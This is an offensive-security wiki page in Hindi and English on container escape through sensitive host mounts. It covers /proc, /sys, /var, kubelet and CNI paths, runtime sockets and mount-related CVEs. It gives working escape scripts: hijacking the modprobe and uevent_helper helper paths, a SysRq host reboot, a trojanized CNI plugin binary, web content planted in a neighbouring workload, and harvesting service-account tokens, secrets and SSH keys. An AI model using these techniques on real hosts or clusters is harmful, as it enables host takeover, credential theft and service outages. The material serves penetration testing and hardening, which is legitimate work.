# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts कंटेनर-escape के सबसे महत्वपूर्ण practical surfaces में से एक हैं, क्योंकि ये अक्सर carefully isolated process view को सीधे host resources की visibility में बदल देते हैं। खतरनाक cases केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, या device-related paths के bind mounts kernel controls, credentials, neighboring container filesystems, और runtime management interfaces को expose कर सकते हैं।

यह page individual protection pages से अलग इसलिए मौजूद है क्योंकि abuse model cross-cutting है। एक writable host mount partly mount namespaces की वजह से dangerous है, partly user namespaces की वजह से, partly AppArmor या SELinux coverage की वजह से, और partly इसलिए कि exactly कौन सा host path expose हुआ। इसे अपना अलग topic मानने से attack surface को समझना काफी आसान हो जाता है।

## `/proc` Exposure

procfs में ordinary process information और high-impact kernel control interfaces दोनों होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount या ऐसा container view जो unexpected writable proc entries expose करता है, information disclosure, denial of service, या direct host code execution तक ले जा सकता है।

High-value procfs paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

सबसे पहले यह जांचें कि कौन-सी high-value procfs entries visible हैं या writable हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
ये paths अलग-अलग कारणों से interesting हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए शक्तिशाली reconnaissance sources हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context दिखाते हैं, जो container के अंदर से host layout को reconstruct करने में मदद कर सकते हैं।

हर path का practical value अलग होता है, और उन सभी को एक जैसा impact वाला मानने से triage मुश्किल हो जाता है:

- `/proc/sys/kernel/core_pattern`
अगर writable हो, तो यह सबसे high-impact procfs paths में से एक है क्योंकि crash के बाद kernel एक pipe handler execute करेगा। एक container जो `core_pattern` को अपने overlay में stored payload या किसी mounted host path पर point कर सकता है, अक्सर host code execution हासिल कर सकता है। एक dedicated example के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
यह path उस userspace helper को control करता है जिसे kernel तब इस्तेमाल करता है जब उसे module-loading logic invoke करनी होती है। अगर container से writable हो और host context में interpreted हो, तो यह host code-execution का एक और primitive बन सकता है। जब इसे helper path trigger करने के तरीके के साथ combine किया जाए, तब यह खास तौर पर interesting होता है।
- `/proc/sys/vm/panic_on_oom`
आमतौर पर यह clean escape primitive नहीं है, लेकिन memory pressure को host-wide denial of service में बदल सकता है, क्योंकि OOM conditions को kernel panic behavior में convert कर देता है।
- `/proc/sys/fs/binfmt_misc`
अगर registration interface writable हो, तो attacker चुनी हुई magic value के लिए handler register कर सकता है और matching file execute होने पर host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
Kernel exploit triage के लिए उपयोगी। यह host package metadata की जरूरत बिना बताए कि कौन से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
ज्यादातर denial-of-service path, लेकिन बहुत गंभीर। यह host को तुरंत reboot, panic, या किसी और तरह से disrupt कर सकता है।
- `/proc/kmsg`
Kernel ring buffer messages दिखाता है। Host fingerprinting, crash analysis, और कुछ environments में kernel exploitation के लिए उपयोगी information leak करने के लिए भी काम आता है।
- `/proc/kallsyms`
जब readable हो, तब यह valuable होता है क्योंकि यह exported kernel symbol information expose करता है और kernel exploit development के दौरान address randomization assumptions को defeat करने में मदद कर सकता है।
- `/proc/[pid]/mem`
यह direct process-memory interface है। अगर target process आवश्यक ptrace-style conditions के साथ reachable हो, तो यह किसी दूसरे process की memory पढ़ने या modify करने की अनुमति दे सकता है। वास्तविक impact credentials, `hidepid`, Yama, और ptrace restrictions पर बहुत निर्भर करता है, इसलिए यह powerful लेकिन conditional path है।
- `/proc/kcore`
System memory का core-image-style view expose करता है। यह file बहुत बड़ी और इस्तेमाल में awkward होती है, लेकिन अगर यह meaningfully readable हो, तो यह host memory surface के badly exposed होने का संकेत है।
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces। कई modern systems पर ये disabled या heavily restricted होते हैं, लेकिन अगर मौजूद और usable हों, तो इन्हें critical findings की तरह treat करना चाहिए।
- `/proc/sched_debug`
Scheduling और task information leak करता है, जिससे host process identities expose हो सकती हैं, भले ही process views अपेक्षा से साफ़ लगें।
- `/proc/[pid]/mountinfo`
Container वास्तव में host पर कहाँ live है, कौन से paths overlay-backed हैं, और क्या writable mount host content से correspond करता है या सिर्फ container layer से — यह reconstruct करने के लिए बेहद उपयोगी है।

अगर `/proc/[pid]/mountinfo` या overlay details readable हों, तो उन्हें container filesystem का host path recover करने के लिए use करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये commands उपयोगी हैं क्योंकि कई host-execution tricks के लिए container के अंदर के path को host के point of view से उसके corresponding path में बदलना पड़ता है।

### Full Example: `modprobe` Helper Path Abuse

यदि `/proc/sys/kernel/modprobe` container से writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload की ओर redirect किया जा सकता है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
सटीक trigger target और kernel behavior पर निर्भर करता है, लेकिन महत्वपूर्ण बात यह है कि एक writable helper path future kernel helper invocation को attacker-controlled host-path content की ओर redirect कर सकता है।

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

यदि लक्ष्य exploitability assessment है, न कि तुरंत escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह answer करने में मदद करते हैं कि क्या useful symbol information visible है, क्या recent kernel messages कोई interesting state reveal करते हैं, और कौन-सी kernel features या mitigations compiled in हैं। इसका impact आमतौर पर direct escape नहीं होता, लेकिन यह kernel-vulnerability triage को काफी तेज़ कर सकता है।

### Full Example: SysRq Host Reboot

अगर `/proc/sysrq-trigger` writable है और host view तक पहुँचता है:
```bash
echo b > /proc/sysrq-trigger
```
प्रभाव तत्काल host reboot है। यह कोई सूक्ष्म उदाहरण नहीं है, लेकिन यह साफ़ दिखाता है कि procfs exposure केवल information disclosure से कहीं अधिक गंभीर हो सकती है।

## `/sys` Exposure

sysfs kernel और device state की बड़ी मात्रा expose करता है। कुछ sysfs paths मुख्यतः fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration, या firmware state को प्रभावित कर सकते हैं।

High-value sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths अलग-अलग कारणों से महत्वपूर्ण हैं। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए badly exposed environments में host stability पर असर डाल सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout information leak कर सकता है, जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security` Linux Security Modules द्वारा उपयोग किया जाने वाला `securityfs` interface है, इसलिए वहाँ unexpected access MAC-related state को expose या alter कर सकता है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, इसलिए वे साधारण configuration files से कहीं अधिक गंभीर हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है क्योंकि यह जानबूझकर developer-oriented interface है, जिसमें hardened production-facing kernel APIs की तुलना में बहुत कम safety expectations होती हैं।

इन paths के लिए उपयोगी review commands हैं:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
उन commands को interesting बनाने वाली बातें:

- `/sys/kernel/security` यह दिखा सकता है कि AppArmor, SELinux, या कोई और LSM surface ऐसे तरीके से visible है जो host-only रहना चाहिए था।
- `/sys/kernel/debug` अक्सर इस group में सबसे alarming finding होता है। अगर `debugfs` mounted है और readable या writable है, तो एक wide kernel-facing surface की उम्मीद करें, जिसका exact risk enabled debug nodes पर निर्भर करता है।
- EFI variable exposure कम common है, लेकिन अगर present हो, तो यह high impact है क्योंकि यह ordinary runtime files के बजाय firmware-backed settings को touch करता है।
- `/sys/class/thermal` मुख्य रूप से host stability और hardware interaction से संबंधित है, neat shell-style escape से नहीं।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host-fingerprinting और crash-analysis का source है, जो low-level kernel state समझने में useful है।

### Full Example: `uevent_helper`

अगर `/sys/kernel/uevent_helper` writable है, तो kernel `uevent` trigger होने पर attacker-controlled helper execute कर सकता है:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
इसका काम करने का कारण यह है कि helper path को host के point of view से interpret किया जाता है। Once triggered, helper host context में चलता है, न कि current container के अंदर।

## `/var` Exposure

Host के `/var` को container में mount करना अक्सर underestimated होता है क्योंकि यह `/` को mount करने जितना dramatic नहीं दिखता। Practical रूप से यह runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, और neighboring application filesystems तक पहुंचने के लिए पर्याप्त हो सकता है। Modern nodes पर, `/var` अक्सर वही जगह होती है जहां सबसे operationally interesting container state actually रहता है।

### Kubernetes Example

`hostPath: /var` वाला pod अक्सर दूसरे pods के projected tokens और overlay snapshot content पढ़ सकता है:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये बताते हैं कि mount केवल साधारण application data expose करता है या high-impact cluster credentials. एक readable service-account token तुरंत local code execution को Kubernetes API access में बदल सकता है।

यदि token मौजूद है, तो token discovery पर रुकने के बजाय यह validate करें कि वह क्या access कर सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ प्रभाव स्थानीय node access से कहीं बड़ा हो सकता है। Broad RBAC वाला token mounted `/var` को पूरे cluster में compromise में बदल सकता है।

### Docker And containerd Example

Docker hosts पर relevant data अक्सर `/var/lib/docker` के तहत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths के तहत हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि mounted `/var` किसी अन्य workload के writable snapshot contents को expose करता है, तो attacker application files को alter कर सकता है, web content plant कर सकता है, या startup scripts बदल सकता है, बिना current container configuration को touch किए।

Writable snapshot content मिलने के बाद concrete abuse ideas:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
ये commands उपयोगी हैं क्योंकि ये mounted `/var` के तीन मुख्य impact families दिखाते हैं: application tampering, secret recovery, और neighboring workloads में lateral movement।

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin`, या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, और storage helpers के माध्यम से exposed होता है। इन mounts को अक्सर "node plumbing" मानकर नज़रअंदाज़ कर दिया जाता है, लेकिन ये नए pods के execution path में सीधे होते हैं और अक्सर kubelet credentials, projected secrets, registration sockets, और executable host-side plugin binaries contain करते हैं।

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
इन paths क्यों महत्वपूर्ण हैं:

- `/var/lib/kubelet/pki` kubelet client certificates और अन्य node-local credentials expose कर सकता है, जिन्हें कभी-कभी cluster design के अनुसार API server या kubelet-facing TLS endpoints के खिलाफ reuse किया जा सकता है।
- `/var/lib/kubelet/pods` में अक्सर projected service-account tokens और उसी node पर neighboring pods के लिए mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्य रूप से reconnaissance surface है, लेकिन बहुत उपयोगी है: यह दिखाता है कि कौन-से pods और containers अभी GPUs, hugepages, SR-IOV devices, और अन्य scarce node-local resources का उपयोग कर रहे हैं।
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, और `/var/lib/kubelet/plugins_registry` यह reveal करते हैं कि कौन-से CSI, DRA, और device plugins installed हैं और kubelet किन sockets से बात करने की अपेक्षा करता है। अगर ये directories केवल readable नहीं बल्कि writable हों, तो finding कहीं अधिक गंभीर हो जाती है।
- `/opt/cni/bin` और `/etc/cni/net.d` सीधे pod-network setup path पर होते हैं। वहाँ writable access अक्सर सिर्फ configuration exposure नहीं, बल्कि delayed host-execution primitive होता है।

### Full Example: Writable `/opt/cni/bin`

अगर host CNI binary directory read-write mounted है, तो किसी plugin को replace करना अगले बार जब kubelet उस node पर pod sandbox बनाता है, host execution पाने के लिए पर्याप्त हो सकता है:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
यह mounted `docker.sock` जितना तुरंत नहीं है, लेकिन compromised Kubernetes infrastructure pods में यह अक्सर अधिक realistic होता है। महत्वपूर्ण बात यह है कि modified binary बाद में host network setup flow द्वारा execute किया जाता है, current container द्वारा नहीं।


## Runtime Sockets

Sensitive host mounts में अक्सर full directories के बजाय runtime sockets शामिल होते हैं। ये इतने महत्वपूर्ण हैं कि यहाँ इन्हें explicitly दोहराने लायक है:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
[mount होने के बाद इन सॉकेट्स में से किसी एक के लिए full exploitation flows देखने हेतु [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक quick first interaction pattern के रूप में:]
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई एक सफल हो जाता है, तो "mounted socket" से "start a more privileged sibling container" तक का रास्ता आमतौर पर किसी kernel breakout path से कहीं छोटा होता है।

## Mount-Related CVEs

Host mounts runtime vulnerabilities के साथ भी intersect करते हैं। हाल के महत्वपूर्ण उदाहरण शामिल हैं:

- `CVE-2024-21626` in `runc`, where एक leaked directory file descriptor host filesystem पर working directory रख सकता था।
- `CVE-2024-23651`, `CVE-2024-23652`, और `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows build के दौरान host file access, deletion, or elevated privileges को फिर से introduce कर सकते थे।
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build `/` को read-write expose कर सकते थे।
- `CVE-2025-47290` in `containerd` 2.1.0, where image unpack के दौरान TOCTOU specially crafted image को pull के दौरान host filesystem modify करने दे सकता था।

ये CVEs यहाँ इसलिए महत्वपूर्ण हैं क्योंकि वे दिखाते हैं कि mount handling केवल operator configuration के बारे में नहीं है। runtime स्वयं भी mount-driven escape conditions introduce कर सकता है।

## Checks

Highest-value mount exposures को जल्दी locate करने के लिए इन commands का उपयोग करें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
यहां दिलचस्प क्या है:

- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी high-priority findings हैं।
- Writable proc/sys entries अक्सर इसका मतलब होता है कि mount host-global kernel controls expose कर रहा है, न कि safe container view।
- Mounted `/var` paths को credential और neighboring-workload review की जरूरत होती है, सिर्फ filesystem review की नहीं।
- Kubelet state directories और CNI/plugin paths को runtime sockets जितनी ही priority देनी चाहिए क्योंकि वे अक्सर सीधे node के pod-creation और credential-distribution path पर होते हैं।

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
